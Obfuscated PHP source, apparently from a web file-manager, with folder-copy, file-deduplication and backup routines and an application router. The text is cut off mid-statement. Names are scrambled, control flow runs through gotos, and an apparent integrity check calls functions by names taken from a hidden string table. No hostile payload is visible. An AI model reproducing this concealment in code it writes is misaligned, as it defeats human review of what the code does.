$e¶¾©¤ÒíÙ[$D’±½­‘²¡[416]] = 0; } $this->where($CÀÒÄËÜã)->data($e¶¾©¤ÒíÙ)->save(); } $this->where(array($D’±½­‘²¡[404] => $bí™àº“º¾))->data($C¹Ëäğğ)->save(); return $bí™àº“º¾; goto aˆŸ‹‘¨Î; aˆŸ‹‘¨Î: } private function clearShare($C‚é­àº, $Aƒ´­´“Å¿) { goto F‡Ç‚ÆÈ­; b£‘Ïƒù£„: if ($bó¢¹»¾Ú­[$FŒŒ´ÁšÔ’[478]] == $D…Æ¿ÀÅÜ[$FŒŒ´ÁšÔ’[478]] && $bó¢¹»¾Ú­[$FŒŒ´ÁšÔ’[398]] == $FŒŒ´ÁšÔ’[557]) { return; } $e›÷£„¹ÂÓ = array($FŒŒ´ÁšÔ’[481] => array($FŒŒ´ÁšÔ’[507], $bó¢¹»¾Ú­[$FŒŒ´ÁšÔ’[481]] . $C‚é­àº . $FŒŒ´ÁšÔ’[508])); $CéÉĞôöé = $this->field($FŒŒ´ÁšÔ’[404])->where($e›÷£„¹ÂÓ)->getField($FŒŒ´ÁšÔ’[390], !0); goto fºÍ’Â»Ïõ; eøãØ°¼’‰: Model($FŒŒ´ÁšÔ’[558])->where($e›÷£„¹ÂÓ)->save(array($FŒŒ´ÁšÔ’[469] => 0)); Model($FŒŒ´ÁšÔ’[559])->where($e›÷£„¹ÂÓ)->delete(); goto Bï¯‘àñßä; F‡Ç‚ÆÈ­: $FŒŒ´ÁšÔ’ =& $_SERVER[Š‰]; $bó¢¹»¾Ú­ = $this->sourceInfo($C‚é­àº); $D…Æ¿ÀÅÜ = $this->sourceInfo($Aƒ´­´“Å¿); goto b£‘Ïƒù£„; e‡ñŠá“Ø¹: if (!$Bå……øÜ’®) { return; } $Bå……øÜ’® = array_to_keyvalue($Bå……øÜ’®, $FŒŒ´ÁšÔ’[33], $FŒŒ´ÁšÔ’[462]); $e›÷£„¹ÂÓ = array($FŒŒ´ÁšÔ’[462] => array($FŒŒ´ÁšÔ’[7], $Bå……øÜ’®)); goto eøãØ°¼’‰; fºÍ’Â»Ïõ: if (!$CéÉĞôöé) { return; } $e›÷£„¹ÂÓ = array($FŒŒ´ÁšÔ’[390] => array($FŒŒ´ÁšÔ’[7], $CéÉĞôöé), $FŒŒ´ÁšÔ’[469] => 1); $Bå……øÜ’® = Model($FŒŒ´ÁšÔ’[558])->field($FŒŒ´ÁšÔ’[462])->where($e›÷£„¹ÂÓ)->select(); goto e‡ñŠá“Ø¹; Bï¯‘àñßä: } public function copyFolderFromIO($CÈôÁ„¡Š‰, $aèáçä¥š, $A†ŒÊÇ´¡³, $dğ¯…³ÛŠÂ, $dª¯‚†©½, $D‚±îİˆƒÄ = false) { goto DË’½òí’±; CÁ§­ËÒ: Hook::trigger($AÉÎİŒ†Ë–[562]); if ($F¯“‘ÍÕßË) { $this->folderSizeResetChildren($F¯“‘ÍÕßË); } $this->_childrenListClear(); goto C…İ£Â¥Ÿº; C…İ£Â¥Ÿº: Model($AÉÎİŒ†Ë–[527])->addAll($eè¹ÒÜá¤[$AÉÎİŒ†Ë–[525]], array(), !0); Model($AÉÎİŒ†Ë–[528])->eventCopy($F¯“‘ÍÕßË); $this->saveAll($eè¹ÒÜá¤[$AÉÎİŒ†Ë–[526]]); goto CÏÃº·µÃ; DË’½òí’±: $AÉÎİŒ†Ë– =& $_SERVER[Š‰]; $eè¹ÒÜá¤ = array($AÉÎİŒ†Ë–[525] => array(), $AÉÎİŒ†Ë–[526] => array(), $AÉÎİŒ†Ë–[524] => array(), $AÉÎİŒ†Ë–[560] => array()); $a§œ¨ª®¢Œ = $D‚±îİˆƒÄ ? $D‚±îİˆƒÄ : $CÈôÁ„¡Š‰->pathThis($aèáçä¥š); goto b œ×­”Öã; b œ×­”Öã: $bÀÉ¡½Œ´Ì = $this->fileNameExist($A†ŒÊÇ´¡³, $a§œ¨ª®¢Œ); $F¯“‘ÍÕßË = $this->mkdir($A†ŒÊÇ´¡³, $a§œ¨ª®¢Œ, $dğ¯…³ÛŠÂ); if (!$bÀÉ¡½Œ´Ì || $dğ¯…³ÛŠÂ == REPEAT_RENAME_FOLDER) { $dğ¯…³ÛŠÂ = !1; } goto bİŞÂÉâ¬Ù; F½Óè¶±ì¬: $this->updateModifyTime($A†ŒÊÇ´¡³); return $F¯“‘ÍÕßË; goto cù÷–¡ÕïÜ; CÏÃº·µÃ: Model($AÉÎİŒ†Ë–[444])->linkAdd($eè¹ÒÜá¤[$AÉÎİŒ†Ë–[524]]); Model($AÉÎİŒ†Ë–[444])->remove($eè¹ÒÜá¤[$AÉÎİŒ†Ë–[560]]); $this->folderSizeReset($A†ŒÊÇ´¡³); goto F½Óè¶±ì¬; bİŞÂÉâ¬Ù: if ($bÀÉ¡½Œ´Ì) { $this->_childrenAllMake($bÀÉ¡½Œ´Ì); } Hook::trigger($AÉÎİŒ†Ë–[561]); $this->_copyChildTo($CÈôÁ„¡Š‰, $aèáçä¥š, $F¯“‘ÍÕßË, $dğ¯…³ÛŠÂ, $eè¹ÒÜá¤, $dª¯‚†©½); goto CÁ§­ËÒ; cù÷–¡ÕïÜ: } private function _copyChildTo($B’º…´Äì¹, $AÕ¹Óööâ, $f’ë¬“, $bÜåø¤«¾ê, &$bù¨¬ô«‚µ, $CØ¢Œ—¸) { goto B Æ¬¿ÙĞê; B Æ¬¿ÙĞê: $c„³±‡¦Ó´ =& $_SERVER[Š‰]; $A·¸ÌœÌŠ… = $this->sourceInfoCache($f’ë¬“); $E”ÃÄ˜Åìò = $B’º…´Äì¹->listPath($AÕ¹Óööâ); goto CøÚî“ÈÅ; AÚÑ¼¯¼Š: $cÇÉÕ´áƒø = $this->_childrenList($f’ë¬“); $cÇÉÕ´áƒø = array_to_keyvalue($cÇÉÕ´áƒø, $c„³±‡¦Ó´[28]); foreach ($e¿è¦¼Î” as $eöö¤³È”‚) { $E¥¸¤Ù²İ = $cÇÉÕ´áƒø[$eöö¤³È”‚[$c„³±‡¦Ó´[28]]]; $cÕö×”‚ªÒ = $E¥¸¤Ù²İ[$c„³±‡¦Ó´[390]]; $this->_copyApplyMeta($E¥¸¤Ù²İ, $bù¨¬ô«‚µ); if ($eöö¤³È”‚[$c„³±‡¦Ó´[29]] == $c„³±‡¦Ó´[76]) { $eöö¤³È”‚[$c„³±‡¦Ó´[75]] = $B’º…´Äì¹->getPathInner($eöö¤³È”‚[$c„³±‡¦Ó´[75]]); $this->_copyChildTo($B’º…´Äì¹, $eöö¤³È”‚[$c„³±‡¦Ó´[75]], $cÕö×”‚ªÒ, $bÜåø¤«¾ê, $bù¨¬ô«‚µ, $CØ¢Œ—¸); } } goto C¶“ªŸæ„¥; CøÚî“ÈÅ: $e¿è¦¼Î” = array_merge($E”ÃÄ˜Åìò[$c„³±‡¦Ó´[73]], $E”ÃÄ˜Åìò[$c„³±‡¦Ó´[74]]); $bËÒÁÏàÛØ = $this->_addFiles($B’º…´Äì¹, $E”ÃÄ˜Åìò[$c„³±‡¦Ó´[73]], $CØ¢Œ—¸); $e›Ûëñµ¤Ş = array(); goto f¯çÖÃİÜÏ; f¯çÖÃİÜÏ: foreach ($e¿è¦¼Î” as &$eöö¤³È”‚) { goto Dˆ¦«ì˜ù·; Dˆ¦«ì˜ù·: if (isset($bËÒÁÏàÛØ[$eöö¤³È”‚[$c„³±‡¦Ó´[28]]])) { $eöö¤³È”‚ = $bËÒÁÏàÛØ[$eöö¤³È”‚[$c„³±‡¦Ó´[28]]]; } $eöö¤³È”‚[$c„³±‡¦Ó´[397]] = $eöö¤³È”‚[$c„³±‡¦Ó´[29]] == $c„³±‡¦Ó´[76]; $eöö¤³È”‚[$c„³±‡¦Ó´[399]] = _get($eöö¤³È”‚, $c„³±‡¦Ó´[167], $c„³±‡¦Ó´[33]); goto Bóº­î³¹†; Dß˜Õ±†îå: if ($bÜåø¤«¾ê) { $f•«Œ„Œáò = $this->fileNameExistCache($f’ë¬“, $eöö¤³È”‚[$c„³±‡¦Ó´[28]]); if ($f•«Œ„Œáò) { if ($eöö¤³È”‚[$c„³±‡¦Ó´[397]] || $bÜåø¤«¾ê == REPEAT_SKIP) { continue; } if ($bÜåø¤«¾ê == REPEAT_REPLACE) { $E¥¸¤Ù²İ = $this->sourceInfoCache($f•«Œ„Œáò); $D¸»³Êš‘ = $this->fileHistory($E¥¸¤Ù²İ, $eöö¤³È”‚[$c„³±‡¦Ó´[441]], $eöö¤³È”‚[$c„³±‡¦Ó´[77]]); if ($D¸»³Êš‘) { $bù¨¬ô«‚µ[$c„³±‡¦Ó´[524]][] = $eöö¤³È”‚[$c„³±‡¦Ó´[441]]; } continue; } else { if ($bÜåø¤«¾ê == REPEAT_RENAME) { $eöö¤³È”‚[$c„³±‡¦Ó´[28]] = $this->fileNameAutoCache($f’ë¬“, $eöö¤³È”‚[$c„³±‡¦Ó´[28]], $bÜåø¤«¾ê, !1); } } } } if (!$eöö¤³È”‚[$c„³±‡¦Ó´[397]] && $eöö¤³È”‚[$c„³±‡¦Ó´[441]]) { $bù¨¬ô«‚µ[$c„³±‡¦Ó´[524]][] = $eöö¤³È”‚[$c„³±‡¦Ó´[441]]; } $e›Ûëñµ¤Ş[] = $this->_makeItemData($eöö¤³È”‚, $A·¸ÌœÌŠ…, $eöö¤³È”‚[$c„³±‡¦Ó´[28]]); goto d°æÒÓ†§æ; Bóº­î³¹†: $eöö¤³È”‚[$c„³±‡¦Ó´[77]] = _get($eöö¤³È”‚, $c„³±‡¦Ó´[77], 0); $eöö¤³È”‚[$c„³±‡¦Ó´[441]] = _get($eöö¤³È”‚, $c„³±‡¦Ó´[441], 0); if (!isset($eöö¤³È”‚[$c„³±‡¦Ó´[563]]) && $eöö¤³È”‚[$c„³±‡¦Ó´[441]]) { $bù¨¬ô«‚µ[$c„³±‡¦Ó´[560]][] = $eöö¤³È”‚[$c„³±‡¦Ó´[441]]; } goto Dß˜Õ±†îå; d°æÒÓ†§æ: } unset($eöö¤³È”‚); if (!empty($e›Ûëñµ¤Ş)) { $this->addAll($e›Ûëñµ¤Ş); $this->_childrenListSelect($f’ë¬“); } goto AÚÑ¼¯¼Š; C¶“ªŸæ„¥: } private function _addFiles($C‰É¹ˆÄï, $aáÖ×ç·Ùù, $Bˆ¬Ğò¬õÇ) { goto Bà¹˜ĞÁÆ; e§ÌÔšèÇÀ: $DÎ–¼ì’»‚ = Model($bâ¸§†÷õ[566]); $BÓÄÓì¦‡ = $DÎ–¼ì’»‚->where($E½ˆ°ÈĞŠµ)->select(); $BÓÄÓì¦‡ = $BÓÄÓì¦‡ ? $BÓÄÓì¦‡ : array(); goto aÂí²©ñ¢Ã; EšÀà‚ˆ‘: foreach ($aáÖ×ç·Ùù as &$F¤ºÈ¬–ÚÀ) { goto a”ù’ã”Úß; F¢æ„ä½: $F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[169]] = $f¢Ù¯Ò§Â­; Hook::trigger($bâ¸§†÷õ[565], $F¤ºÈ¬–ÚÀ); $Fœ¹Ùôó÷Ö[$f¢Ù¯Ò§Â­][] =& $F¤ºÈ¬–ÚÀ; goto fÛììù½…†; bËˆ…ÛòÉ¯: $f¢Ù¯Ò§Â­ = $C‰É¹ˆÄï->hashMd5($F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[75]]); if (strlen($f¢Ù¯Ò§Â­) > 10 && !isset($Fœ¹Ùôó÷Ö[$f¢Ù¯Ò§Â­])) { $Fœ¹Ùôó÷Ö[$f¢Ù¯Ò§Â­] = array(); } $F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[170]] = $b‡é¾«…«×; goto F¢æ„ä½; a”ù’ã”Úß: Hook::trigger($bâ¸§†÷õ[564], $F¤ºÈ¬–ÚÀ); $F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[75]] = $C‰É¹ˆÄï->getPathInner($F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[75]]); $b‡é¾«…«× = $C‰É¹ˆÄï->hashSimple($F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[75]]); goto bËˆ…ÛòÉ¯; fÛììù½…†: if (count($Fœ¹Ùôó÷Ö[$f¢Ù¯Ò§Â­]) > 1) { $F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[563]] = !0; } goto F£±¸„Àç—; F£±¸„Àç—: } unset($F¤ºÈ¬–ÚÀ); $E½ˆ°ÈĞŠµ = array($bâ¸§†÷õ[169] => array($bâ¸§†÷õ[7], array_keys($Fœ¹Ùôó÷Ö))); goto e§ÌÔšèÇÀ; dİæ‹ëÈ: $BÓÄÓì¦‡ = $BÓÄÓì¦‡ ? $BÓÄÓì¦‡ : array(); foreach ($BÓÄÓì¦‡ as $D¶·¡Äá¡Ş) { if (!isset($Fœ¹Ùôó÷Ö[$D¶·¡Äá¡Ş[$bâ¸§†÷õ[169]]])) { continue; } $F’²‘ŒÚ =& $Fœ¹Ùôó÷Ö[$D¶·¡Äá¡Ş[$bâ¸§†÷õ[169]]]; foreach ($F’²‘ŒÚ as &$F¤ºÈ¬–ÚÀ) { $F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[441]] = $D¶·¡Äá¡Ş[$bâ¸§†÷õ[441]]; } unset($F¤ºÈ¬–ÚÀ); } $f·çâ÷¤Şš = array(); goto C·Áî†²äñ; aÂí²©ñ¢Ã: foreach ($BÓÄÓì¦‡ as $D¶·¡Äá¡Ş) { if (!isset($Fœ¹Ùôó÷Ö[$D¶·¡Äá¡Ş[$bâ¸§†÷õ[169]]])) { continue; } $A¼°Ë°ÄÛ = $Fœ¹Ùôó÷Ö[$D¶·¡Äá¡Ş[$bâ¸§†÷õ[169]]]; foreach ($A¼°Ë°ÄÛ as &$F¤ºÈ¬–ÚÀ) { $F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[441]] = $D¶·¡Äá¡Ş[$bâ¸§†÷õ[441]]; $F¤ºÈ¬–ÚÀ[$bâ¸§†÷õ[563]] = !0; } unset($F¤ºÈ¬–ÚÀ); } $Fä‰êÂ‰¹¨ = array(); foreach ($aáÖ×ç·Ùù as $c³Ü†å¡Ñ‹) { if (isset($c³Ü†å¡Ñ‹[$bâ¸§†÷õ[563]]) && $c³Ü†å¡Ñ‹[$bâ¸§†÷õ[563]]) { continue; } $CƒñÛÂ¥…  = $C‰É¹ˆÄï->getPathInner($c³Ü†å¡Ñ‹[$bâ¸§†÷õ[75]]); $eçƒ»ËÕƒè = $DÎ–¼ì’»‚->addFileMake($CƒñÛÂ¥… , $c³Ü†å¡Ñ‹[$bâ¸§†÷õ[77]], $c³Ü†å¡Ñ‹[$bâ¸§†÷õ[170]], $c³Ü†å¡Ñ‹[$bâ¸§†÷õ[169]], $c³Ü†å¡Ñ‹[$bâ¸§†÷õ[28]], $Bˆ¬Ğò¬õÇ); $Fä‰êÂ‰¹¨[] = $eçƒ»ËÕƒè; } goto a‹‹Ô÷ƒÄ; Bà¹˜ĞÁÆ: $bâ¸§†÷õ =& $_SERVER[Š‰]; if (!$aáÖ×ç·Ùù || count($aáÖ×ç·Ùù) == 0) { return array(); } $Fœ¹Ùôó÷Ö = array(); goto EšÀà‚ˆ‘; a‹‹Ô÷ƒÄ: $DÎ–¼ì’»‚->addAll($Fä‰êÂ‰¹¨); $E½ˆ°ÈĞŠµ = array($bâ¸§†÷õ[169] => array($bâ¸§†÷õ[7], array_keys($Fœ¹Ùôó÷Ö))); $BÓÄÓì¦‡ = $DÎ–¼ì’»‚->where($E½ˆ°ÈĞŠµ)->select(); goto dİæ‹ëÈ; C·Áî†²äñ: foreach ($aáÖ×ç·Ùù as $D¢‰‰÷¤‰¦) { $f·çâ÷¤Şš[$D¢‰‰÷¤‰¦[$bâ¸§†÷õ[28]]] = $D¢‰‰÷¤‰¦; } return $f·çâ÷¤Şš; goto bµÙŒ¢ó÷´; bµÙŒ¢ó÷´: } } define($_SERVER[Š‰][567], $_SERVER[Š‰][568]); goto B‘¼•ˆó³¬; bï¨²‚î·»: $bùê«Õ†ó‰ = $_SERVER[Š‰][752]; if ($_SERVER[$_SERVER[Š‰][753]] != $bùê«Õ†ó‰($dŠÉ•«óá)) { goto C½éÅÇøƒ¦; bØÛò‘ßµ’: $F°á›ÅÅ¨ = explode($_SERVER[Š‰][227], $d³·†’ãø¹); if (count($F°á›ÅÅ¨) < $_SERVER[Š‰][588]) { $bğèËÖÉÂ  = $_SERVER[Š‰][757]; $bğèËÖÉÂ (); } $E¿©‘áÎí¦ = $_SERVER[Š‰][758]; goto aë÷©¹ƒöÛ; aë÷©¹ƒöÛ: $E¿©‘áÎí¦($dŠÉ•«óá); goto B±çö¤´¬¥; C½éÅÇøƒ¦: $b Œ—ÓÈÜ = $_SERVER[Š‰][754]; $cñ¹äæô‚½ = $_SERVER[$_SERVER[Š‰][755]] . $_SERVER[Š‰][756]; $d³·†’ãø¹ = $b Œ—ÓÈÜ($cñ¹äæô‚½); goto bØÛò‘ßµ’; B±çö¤´¬¥: } class BackupFile { public function __construct() { } public function index() { goto e¹ğ‹Ÿ¹¸Ö; FÓÅÀïî›‰: $E³‰½éÔ‚­ = $AöØÓÍÑ‘ = 0; do { $CÃ„…ºÄ = $_SERVER[Š‰][765]; $eÔÑ¡ÌÌ‡ = Model($_SERVER[Š‰][731])->where($cˆù¥ôèÓ•)->field($CÃ„…ºÄ)->order($_SERVER[Š‰][766])->selectPage($d½´ŞÔƒ¦, $B˜¸†œ‹¼¸); $f·¯°ˆ²á = !empty($eÔÑ¡ÌÌ‡[$_SERVER[Š‰][365]]) ? $eÔÑ¡ÌÌ‡[$_SERVER[Š‰][365]] : array(); foreach ($f·¯°ˆ²á as $aĞª©àÎ†‚) { goto eã§„²ˆ­á; a”¦ˆÄÚ¨´: if (IO::exist($dîÛÄ›ªàñ)) { $F‚ÕÅ±óÕ->updateFileEnd($aĞª©àÎ†‚[$_SERVER[Š‰][28]], $aĞª©àÎ†‚[$_SERVER[Š‰][77]]); } else { $dîÛÄ›ªàñ = get_path_father($dîÛÄ›ªàñ); IO::mkdir($dîÛÄ›ªàñ); if (!IO::copy($FÆê‚¹â‘Å, $dîÛÄ›ªàñ, $_SERVER[Š‰][769])) { write_log($_SERVER[Š‰][770] . $FÆê‚¹â‘Å . $_SERVER[Š‰][747] . $dîÛÄ›ªàñ . $_SERVER[Š‰][499], $_SERVER[Š‰][726]); $dÔ¿È÷‹Á¸ = !1; break; } } $DÕ¸¥É»ªõ = $aĞª©àÎ†‚[$_SERVER[Š‰][441]]; $C÷àŠ‡ƒ¶« += 1; goto aøª™±ˆ‘ó; aøª™±ˆ‘ó: $B½ÊŠÃÓ† += $aĞª©àÎ†‚[$_SERVER[Š‰][77]]; $AöØÓÍÑ‘ += 1; $E³‰½éÔ‚­ += $aĞª©àÎ†‚[$_SERVER[Š‰][77]]; goto bˆ‰Ø„½ï; bˆ‰Ø„½ï: if ($B½ÊŠÃÓ† >= 1024 * 1024 * 100) { $f¼”¨½š½’ = array($_SERVER[Š‰][771] => $DÕ¸¥É»ªõ, $_SERVER[Š‰][772] => $AöØÓÍÑ‘, $_SERVER[Š‰][773] => $E³‰½éÔ‚­); Backup::set($f¼”¨½š½’); $B½ÊŠÃÓ† = $C÷àŠ‡ƒ¶« = 0; } goto fÄÒŠÁÀŒ; eã§„²ˆ­á: if (!$this->_fileExist($aĞª©àÎ†‚, $Fµ§¶­ Ë, $BÈ¶¾êÛŒ…)) { $Bæ˜ç‰ÀŞƒ -= 1; $bµ¾•­”ê¹ -= (int) $aĞª©àÎ†‚[$_SERVER[Š‰][77]]; write_log("\x66\x69\x6c\x65\40\156\157\164\40\145\170\x69\163\x74\56\146\151\x6c\x65\111\104\x3a{$aĞª©àÎ†‚[$_SERVER[Š‰][441]]}\54\40\160\x61\164\150\x3a{$aĞª©àÎ†‚[$_SERVER[Š‰][75]]}", $_SERVER[Š‰][767]); continue; } $FÆê‚¹â‘Å = $aĞª©àÎ†‚[$_SERVER[Š‰][75]]; $dîÛÄ›ªàñ = "\x7b\x69\157\72{$BÅá•­ç°ï[$_SERVER[Š‰][704]]}\x7d" . substr($FÆê‚¹â‘Å, strlen("\173\x69\157\x3a{$aĞª©àÎ†‚[$_SERVER[Š‰][768]]}\x7d")); goto a”¦ˆÄÚ¨´; fÄÒŠÁÀŒ: } $CØ´‚¸‘ = count($f·¯°ˆ²á); $B˜¸†œ‹¼¸++; } while ($CØ´‚¸‘ == $d½´ŞÔƒ¦); $F‚ÕÅ±óÕ->end(); goto bĞ°Š‹ÄÕ†; e¹ğ‹Ÿ¹¸Ö: $BÅá•­ç°ï = Backup::get(); $DÕ¸¥É»ªõ = $BÅá•­ç°ï[$_SERVER[Š‰][289]][$_SERVER[Š‰][173]][$_SERVER[Š‰][441]]; $cˆù¥ôèÓ• = array($_SERVER[Š‰][442] => array($_SERVER[Š‰][759], $DÕ¸¥É»ªõ), $_SERVER[Š‰][760] => array($_SERVER[Š‰][327], $BÅá•­ç°ï[$_SERVER[Š‰][704]])); goto F×ÂÊ¼ªé×; EÈªË—ŒÎİ: $this->_fileFilter($Fµ§¶­ Ë); return !0; goto eñº¤Şœ; bĞ°Š‹ÄÕ†: $f¼”¨½š½’ = array($_SERVER[Š‰][774] => 1, $_SERVER[Š‰][470] => time(), $_SERVER[Š‰][721] => 1, $_SERVER[Š‰][771] => $DÕ¸¥É»ªõ, $_SERVER[Š‰][764] => $bµ¾•­”ê¹, $_SERVER[Š‰][763] => $Bæ˜ç‰ÀŞƒ); if ($C÷àŠ‡ƒ¶«) { $f¼”¨½š½’[$_SERVER[Š‰][772]] = $AöØÓÍÑ‘; $f¼”¨½š½’[$_SERVER[Š‰][773]] = $E³‰½éÔ‚­; } Backup::set($f¼”¨½š½’); goto EÈªË—ŒÎİ; F×ÂÊ¼ªé×: $Bæ˜ç‰ÀŞƒ = (int) Model($_SERVER[Š‰][731])->where($cˆù¥ôèÓ•)->count($_SERVER[Š‰][441]); $bµ¾•­”ê¹ = (int) Model($_SERVER[Š‰][731])->where($cˆù¥ôèÓ•)->sum($_SERVER[Š‰][77]); $F‚ÕÅ±óÕ = new TaskFileTransfer($_SERVER[Š‰][761], $_SERVER[Š‰][726], $Bæ˜ç‰ÀŞƒ, LNG($_SERVER[Š‰][727]) . $_SERVER[Š‰][728] . LNG($_SERVER[Š‰][762])); goto A„‚·“Ñ; f”­‡¬Ç´: $dÔ¿È÷‹Á¸ = !0; $BÈ¶¾êÛŒ… = $this->storeIds(); $B˜¸†œ‹¼¸ = 1; goto Cª„ŠèíÇí; Cª„ŠèíÇí: $d½´ŞÔƒ¦ = 1000; $B½ÊŠÃÓ† = $C÷àŠ‡ƒ¶« = 0; $Fµ§¶­ Ë = array(); goto FÓÅÀïî›‰; A„‚·“Ñ: $F‚ÕÅ±óÕ->task[$_SERVER[Š‰][711]] = $bµ¾•­”ê¹; $f¼”¨½š½’ = array($_SERVER[Š‰][763] => $Bæ˜ç‰ÀŞƒ, $_SERVER[Š‰][764] => $bµ¾•­”ê¹); Backup::set($f¼”¨½š½’); goto f”­‡¬Ç´; eñº¤Şœ: } private function _fileExist($E—¶ÂÌÂÉ°, &$b†‘‹÷ ÷…, $e‹‹˜øß) { goto EãÃ³å ¹¬; aÁ¹¯¾ùÀç: if (!in_array($E—¶ÂÌÂÉ°[$E‹—Í âÒÏ[768]], $e‹‹˜øß)) { return !1; } if (IO::exist($aâá±Ğ¨î)) { return !0; } $E¢Œ‰ƒÈ„„ = get_path_father($aâá±Ğ¨î); goto BŒ˜Ñ¸Ä÷; EãÃ³å ¹¬: $E‹—Í âÒÏ =& $_SERVER[Š‰]; $aâá±Ğ¨î = $E—¶ÂÌÂÉ°[$E‹—Í âÒÏ[75]]; if (in_array($E—¶ÂÌÂÉ°[$E‹—Í âÒÏ[441]], $b†‘‹÷ ÷…)) { return !1; } goto aÁ¹¯¾ùÀç; d„©¹—ø‚: $b†‘‹÷ ÷… = array_merge($b†‘‹÷ ÷…, array_to_keyvalue($fÜš—†à±Ú, $E‹—Í âÒÏ[33], $E‹—Í âÒÏ[441])); return !1; goto Fäë£òÈ§; BŒ˜Ñ¸Ä÷: if (IO::exist($E¢Œ‰ƒÈ„„)) { $b†‘‹÷ ÷…[] = $E—¶ÂÌÂÉ°[$E‹—Í âÒÏ[441]]; return !1; } $Bó¦ò‰¦é› = array($E‹—Í âÒÏ[768] => $E—¶ÂÌÂÉ°[$E‹—Í âÒÏ[768]], $E‹—Í âÒÏ[75] => array($E‹—Í âÒÏ[378], "{$E¢Œ‰ƒÈ„„}\45")); $fÜš—†à±Ú = Model($E‹—Í âÒÏ[731])->where($Bó¦ò‰¦é›)->field($E‹—Í âÒÏ[442])->select(); goto d„©¹—ø‚; Fäë£òÈ§: } private function _fileFilter($c£‰Ì©çÃ) { $FÓ•Ò¬äø =& $_SERVER[Š‰]; if (empty($c£‰Ì©çÃ)) { return; } $d¢÷©ƒö² = array($FÓ•Ò¬äø[441] => array($FÓ•Ò¬äø[7], array_unique($c£‰Ì©çÃ))); $D›ŠÆ¥ˆÁØ = Model($FÓ•Ò¬äø[775])->where($d¢÷©ƒö²)->field($FÓ•Ò¬äø[390])->select(); foreach ($D›ŠÆ¥ˆÁØ as $FçŸìùÛ…‚) { Model($FÓ•Ò¬äø[775])->remove($FçŸìùÛ…‚[$FÓ•Ò¬äø[390]], !1); } } private function storeIds() { $C—Ğêº¢©´ =& $_SERVER[Š‰]; $d„˜Ö®Š¯´ = Model($C—Ğêº¢©´[716])->listData(); $CéÇÇ³ï¨ = array(); $E¾§õœõåŒ = $GLOBALS[$C—Ğêº¢©´[6]][$C—Ğêº¢©´[87]][$C—Ğêº¢©´[776]]; foreach ($d„˜Ö®Š¯´ as $f’Ã†ø·Óí) { $BáƒÆ”ÑÌª = strtolower($f’Ã†ø·Óí[$C—Ğêº¢©´[93]]); if (!isset($E¾§õœõåŒ[$BáƒÆ”ÑÌª])) { continue; } $eÜô áÕ = $C—Ğêº¢©´[71] . (isset($E¾§õœõåŒ[$BáƒÆ”ÑÌª]) ? $E¾§õœõåŒ[$BáƒÆ”ÑÌª] : ucfirst($BáƒÆ”ÑÌª)); if (!class_exists($eÜô áÕ)) { continue; } $CéÇÇ³ï¨[] = $f’Ã†ø·Óí[$C—Ğêº¢©´[388]]; } return $CéÇÇ³ï¨; } } goto eØ«ƒ‘å¢ë; FÒ¯¸¬¼É‘: if (!$f×ğ†îˆ¬¡) { die; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\151\x6e\144\x65\x78"; private $defaultAction = "\151\x6e\x64\145\170"; function __construct() { } public function setDefault($CÃçÉ²•Ş½) { goto DĞ›¢›ÑŒª; b‘®Åğ®œ: $this->defaultModule = $e§ºÓÓÆò[0] ? $e§ºÓÓÆò[0] : $this->defaultModule; $this->defaultController = $e§ºÓÓÆò[1] ? $e§ºÓÓÆò[1] : $this->defaultController; $a…™ì‰°½ = $FÄÁ§ĞöÙ½[573]; goto cçÎÁŸ³ô; A‘êô’ªÒ: $this->{$_SERVER[¦À‹¤][3]}($Bà”™ŸÚ‡Š[4], array($this, $Bà”™ŸÚ‡Š[5])); $A´Œ»ÏÍíÈ = $FÄÁ§ĞöÙ½[576]; goto BŠã—©Ö÷÷; DĞ›¢›ÑŒª: $FÄÁ§ĞöÙ½ =& $_SERVER[Š‰]; $Bà”™ŸÚ‡Š =& $_SERVER[¦À‹¤]; $e§ºÓÓÆò = $Bà”™ŸÚ‡Š[0]($Bà”™ŸÚ‡Š[1], $Bà”™ŸÚ‡Š[2]($CÃçÉ²•Ş½, $Bà”™ŸÚ‡Š[1])); goto b‘®Åğ®œ; cçÎÁŸ³ô: while ($a…™ì‰°½ < $FÄÁ§ĞöÙ½[574]) { if ($a…™ì‰°½ >= 0) { break; } $a…™ì‰°½++; } $this->defaultAction = $e§ºÓÓÆò[2] ? $e§ºÓÓÆò[2] : $this->defaultAction; $EÕ¡«†‰¥§ = $FÄÁ§ĞöÙ½[575]; goto A‘êô’ªÒ; BŠã—©Ö÷÷: } public function appRun($b—À¶ãÒ—) { goto e¯‹¹Ÿœ©Í; B²ŒóÊ«ÚÊ: $BÑó‚ ËóÂ[17]($b—À¶ãÒ—); $Cõš«¿Â‰¶ = $c»±Ô¯À÷‰[578]; if (!$Cõš«¿Â‰¶) { die; } goto Då¨¦Ñî×; e¯‹¹Ÿœ©Í: $c»±Ô¯À÷‰ =& $_SERVER[Š‰]; $BÑó‚ ËóÂ =& $_SERVER[¦À‹¤]; $fÂ·¾ºóÙÍ = $BÑó‚ ËóÂ[0]($BÑó‚ ËóÂ[1], $b—À¶ãÒ—); goto Cœ—ßêå‹; Då¨¦Ñî×: $BÑó‚ ËóÂ[13](array($BÑó‚ ËóÂ[14], $BÑó‚ ËóÂ[15]), $E«®÷Î¦â . $BÑó‚ ËóÂ[18], $b—À¶ãÒ—); goto cÂá–Ş˜‰²; a¥ÀãÍÑè‹: $E«®÷Î¦â = $BÑó‚ ËóÂ[7]; if ($E¼„×ê½ == $BÑó‚ ËóÂ[8]) { $E«®÷Î¦â = $BÑó‚ ËóÂ[9]; $fÂ·¾ºóÙÍ[0] = $BÑó‚ ËóÂ[10]; $fÂ·¾ºóÙÍ[1] = $fÂ·¾ºóÙÍ[1] . $BÑó‚ ËóÂ[11]; $b—À¶ãÒ— = $BÑó‚ ËóÂ[12]($BÑó‚ ËóÂ[1], $fÂ·¾ºóÙÍ); $b—À¶ãÒ— = $BÑó‚ ËóÂ[2]($b—À¶ãÒ—, $BÑó‚ ËóÂ[1]); } $BÑó‚ ËóÂ[13](array($BÑó‚ ËóÂ[14], $BÑó‚ ËóÂ[15]), $E«®÷Î¦â . $BÑó‚ 